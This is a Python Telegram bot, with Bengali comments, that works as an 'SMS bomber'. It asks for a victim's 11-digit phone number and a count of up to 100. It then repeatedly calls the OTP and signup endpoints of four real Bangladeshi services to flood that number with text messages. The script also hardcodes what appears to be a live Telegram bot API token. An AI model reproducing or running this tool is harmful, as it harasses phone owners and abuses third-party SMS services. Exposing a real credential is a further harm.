import telebot
import requests
import time
from telebot import types
from flask import Flask
from threading import Thread

# ১. সেটিংস
API_TOKEN = '8678067992:AAH-gaEdP_KdS47FefM1G-Tl5HI0Wb1PQHM'
CHANNEL_USERNAME = '@developer_of_maruf' 

bot = telebot.TeleBot(API_TOKEN)
user_data = {}
verified_users = set()

# ২. Render সচল রাখার জন্য Flask
app = Flask('')
@app.route('/')
def home(): return "Power Bomber is Live!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

def check_join(chat_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# ৩. কমান্ড হ্যান্ডলার
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if check_join(chat_id):
        # ভেরিফিকেশন মেসেজ শুধু প্রথমবার আসবে
        if chat_id not in verified_users:
            bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল হয়েছে!**", parse_mode="Markdown")
            verified_users.add(chat_id)
            time.sleep(0.5)
        
        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন নাম্বারটি দিন (১১ ডিজিট):")
        bot.register_next_step_handler(msg, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("✅ Verify Done", callback_data="verify_join"))
        bot.send_message(chat_id, "❌ আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    if check_join(call.message.chat.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)

# ৪. নাম্বার ইনপুট ও চেক
def get_number(message):
    num = message.text
    if num == "/start":
        welcome(message)
        return
    
    if not num or not num.isdigit() or len(num) != 11:
        msg = bot.send_message(message.chat.id, "⚠️ ভুল নাম্বার! ১১ ডিজিটের সঠিক নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
        
    user_data[message.chat.id] = num
    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান? (১-১০০):")
    bot.register_next_step_handler(msg, send_bomber)

# ৫. বোম্বিং প্রসেস (নতুন কার্যকরী API সহ)
def send_bomber(message):
    try:
        amount = int(message.text)
        num = user_data[message.chat.id]
        if amount > 100: amount = 100 
        
        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
        
        for i in range(amount):
            try:
                # API 1: RedX (খুবই পাওয়ারফুল)
                requests.post("https://api-dest.redx.com.bd/v1/user/signup", json={"phone": num}, timeout=5)
                
                # API 2: Pathao 
                requests.post("https://api.pathao.com/v1/auth/otp/send", json={"phone": num}, timeout=5)
                
                # API 3: Shajgoz
                requests.post("https://fur-api.shajgoz.com/api/v1/auth/send-otp", json={"phone": num}, timeout=5)
                
                # API 4: Chaldal
                requests.post("https://chaldal.com/api/customer/LoginOTP", json={"PhoneNumber": num, "forceSms": True}, timeout=5)

                # প্রতি SMS এর পর বিরতি যাতে রিকোয়েস্ট মিস না হয়
                time.sleep(2) 
            except:
                continue
                
        # আপনার চাওয়া সেই নির্দিষ্ট টেক্সট
        bot.send_message(message.chat.id, "✅ মিশন কমপ্লিট! আবার পাঠাতে চাইলে /start লিখুন।")
    except:
        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা দিন।")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling(skip_pending=True)
